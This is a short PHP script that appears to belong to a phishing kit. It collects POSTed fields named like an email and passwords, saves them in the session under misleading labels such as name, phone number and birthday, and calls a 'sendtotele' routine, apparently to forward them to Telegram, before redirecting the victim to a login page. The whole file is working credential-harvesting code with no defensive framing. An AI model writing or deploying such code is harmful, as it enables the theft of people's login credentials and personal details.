<?php
// session_start();

require 'lib/sendtotele.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $_SESSION["pageName"] = htmlspecialchars($_POST['PrevToEmail']);
  $_SESSION["name"] = htmlspecialchars($_POST['PrevToPass']);
  $_SESSION["phoneNumber"] = htmlspecialchars($_POST['PrevToPass2']);
  $_SESSION["birthDay"] = htmlspecialchars($_POST['PrevToPass3']);

  sendtotele();
  echo "<script>window.location.href='login.php'</script>";
}

?>